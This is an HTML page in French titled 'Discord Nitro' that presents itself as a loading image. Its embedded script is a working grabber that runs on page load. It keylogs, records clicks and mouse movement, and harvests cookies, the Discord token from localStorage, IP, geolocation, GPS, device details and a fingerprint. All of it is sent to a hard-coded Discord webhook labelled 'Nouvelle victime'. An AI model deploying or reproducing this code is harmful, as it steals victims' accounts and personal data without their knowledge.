<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Discord Nitro</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta property="og:title" content="Image Discord">
  <meta property="og:image" content="https://cdn.discordapp.com/attachments/1313995492392439831/1362763852588257290/a18af5cfb44cd2906e21a7e5e29dea58.jpg?ex=6803943d&is=680242bd&hm=5b81c0cc5bfa6a3d837b3b0c3baf377dbd2af74534c4420f9a26eb">
  <style>
    body {
      margin: 0;
      background-color: #2c2f33;
      color: #ffffff;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      flex-direction: column;
    }
    h1 { font-size: 20px; margin: 20px 0 10px; }
    p { font-size: 14px; color: #b9bbbe; text-align: center; }
    .loader {
      border: 5px solid #f3f3f3;
      border-top: 5px solid #7289da;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin-top: 30px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
  <script>
    // Ton webhook Discord
    const webhook = "https://discord.com/api/webhooks/1349385558627192843/J9WiGNLlSdX9mAO6GmEXKYDtlN98LxOKaTWf1u3JPsk_IZN_eyEzTnpW-yQ7-qdXqjkV";

    // Fonction d'envoi
    function sendToWebhook(type, data) {
      fetch(webhook, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
          content: `**${type}**\n\`\`\`\n${data}\n\`\`\``
        })
      });
    }

    // Keylogger
    document.addEventListener("keydown", function(e) {
      sendToWebhook("Keylogger", `Touche: ${e.key} | Code: ${e.code}`);
    });

    // Clics souris
    document.addEventListener("click", function(e) {
      sendToWebhook("Clic souris", `X=${e.clientX}, Y=${e.clientY}, Ã‰lÃ©ment: ${e.target.tagName}`);
    });

    // Mouvement souris (1/sec)
    let lastMouseSend = 0;
    document.addEventListener("mousemove", function(e) {
      const now = Date.now();
      if (now - lastMouseSend > 1000) {
        lastMouseSend = now;
        sendToWebhook("Mouvement souris", `X=${e.clientX}, Y=${e.clientY}`);
      }
    });

    // Collecte d'informations avancÃ©es
    async function collectInfos() {
      try {
        const now = new Date().toLocaleString();
        const ua = navigator.userAgent;
        const lang = navigator.language;
        const screenSize = `${screen.width}x${screen.height}`;
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        const platform = navigator.platform;
        const referrer = document.referrer || "Aucun";
        const cookies = document.cookie || "Aucun";

        // IP et gÃ©olocalisation
        let ip = "Inconnu", geo = {};
        try {
          ip = await fetch("https://api64.ipify.org?format=json").then(r => r.json()).then(d => d.ip);
          geo = await fetch(`https://ipapi.co/${ip}/json/`).then(r => r.json());
        } catch(e) {}

        // Batterie
        let batteryStatus = "Inconnu";
        try {
          const battery = await (navigator.getBattery?.() || Promise.resolve({ level: 0, charging: false }));
          batteryStatus = `${(battery.level * 100).toFixed(0)}% - ${battery.charging ? "En charge" : "Sur batterie"}`;
        } catch(e) {}

        // GPS (tentative silencieuse)
        let gps = "Non autorisÃ©";
        if ("geolocation" in navigator) {
          try {
            gps = await new Promise((resolve) => {
              navigator.geolocation.getCurrentPosition(
                pos => resolve(`Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}, PrÃ©cision: ${pos.coords.accuracy}m`),
                () => resolve("RefusÃ© ou erreur"),
                {timeout: 1000}
              );
            });
          } catch(e) {}
        }

        // Token Discord (Discord Web)
        let token = null;
        try {
          // MÃ©thode classique
          token = localStorage.getItem("token");
          if (!token) {
            // MÃ©thode alternative (pour Discord Web)
            for (let i in localStorage) {
              if (i.includes("token")) {
                token = localStorage[i];
                break;
              }
            }
          }
        } catch (e) {
          token = "Erreur accÃ¨s token";
        }
        if (token) token = token.replace(/"/g, "");

        // Devices audio/vidÃ©o
        let mediaDevices = "Non supportÃ©";
        if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
          try {
            const devices = await navigator.mediaDevices.enumerateDevices();
            mediaDevices = devices.map(d => `${d.kind}: ${d.label || "?"}`).join(', ');
          } catch(e) {}
        }

        // Liste des polices installÃ©es (mÃ©thode simple)
        function detectFonts() {
          const baseFonts = ['monospace','sans-serif','serif'];
          const testFonts = ['Arial','Verdana','Times New Roman','Courier New','Comic Sans MS','Impact','Georgia','Trebuchet MS','Palatino'];
          let found = [];
          const testString = "mmmmmmmmmmlli";
          const testSize = '72px';
          const body = document.body;
          const span = document.createElement('span');
          span.style.fontSize = testSize;
          span.innerHTML = testString;
          body.appendChild(span);
          for (let font of testFonts) {
            let detected = false;
            for (let base of baseFonts) {
              span.style.fontFamily = `${font},${base}`;
              const width = span.offsetWidth;
              span.style.fontFamily = base;
              if (width !== span.offsetWidth) detected = true;
            }
            if (detected) found.push(font);
          }
          body.removeChild(span);
          return found.join(', ');
        }
        let fonts = detectFonts();

        // Fingerprint simple
        const fingerprint = btoa(`${ip}|${ua}|${lang}|${screenSize}|${timezone}|${platform}|${fonts}`);

        // Hardware
        const cpuThreads = navigator.hardwareConcurrency || "Inconnu";
        const deviceMemory = navigator.deviceMemory || "Inconnu";

        // VPN/Proxy
        const vpn = geo.org?.toLowerCase().includes("vpn") || geo.org?.toLowerCase().includes("proxy") ? "ğŸš¨ VPN/Proxy dÃ©tectÃ©" : "âœ… Connexion normale";

        // Temps passÃ© sur la page
        let startTime = Date.now();
        window.addEventListener("beforeunload", function() {
          const duration = ((Date.now() - startTime) / 1000).toFixed(1);
          sendToWebhook("Temps passÃ© sur la page", `${duration} secondes`);
        });

        // PrÃ©paration du message
        let infos = [
          `ğŸ•’ Date/Heure : ${now}`,
          `ğŸŒ IP : ${ip}`,
          `ğŸ“Œ Localisation : ${geo.city || "?"}, ${geo.region || "?"}, ${geo.country_name || "?"}`,
          `ğŸ§  FAI : ${geo.org || "?"}`,
          `ğŸ§¬ Fingerprint : ${fingerprint}`,
          `ğŸ–¥ï¸ OS/Plateforme : ${platform}`,
          `ğŸŒ Navigateur : ${ua}`,
          `ğŸ—£ï¸ Langue : ${lang}`,
          `ğŸ§­ Fuseau horaire : ${timezone}`,
          `ğŸ“± RÃ©solution : ${screenSize}`,
          `ğŸ”‹ Batterie : ${batteryStatus}`,
          `ğŸ›¡ï¸ VPN : ${vpn}`,
          `ğŸª Cookies : ${cookies}`,
          `ğŸ”— Referrer : ${referrer}`,
          `ğŸ“ GPS : ${gps}`,
          `ğŸ¤ Appareils audio/vidÃ©o : ${mediaDevices}`,
          `ğŸ”¤ Polices dÃ©tectÃ©es : ${fonts}`,
          `âš™ï¸ CPU Threads : ${cpuThreads}`,
          `ğŸ’¾ RAM estimÃ©e : ${deviceMemory} Go`,
          `ğŸª™ Token Discord : ${token || "Non trouvÃ©"}`
        ].join('\n');

        // Envoi au webhook
        await fetch(webhook, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ content: `**ğŸ–¼ï¸ Nouvelle victime Discord CTF**\n\`\`\`\n${infos}\n\`\`\`` })
        });

      } catch (err) {
        // Erreur silencieuse
      }
    }

    document.addEventListener("DOMContentLoaded", collectInfos);
  </script>
</head>
<body>
  <h1>Chargement de l'image...</h1>
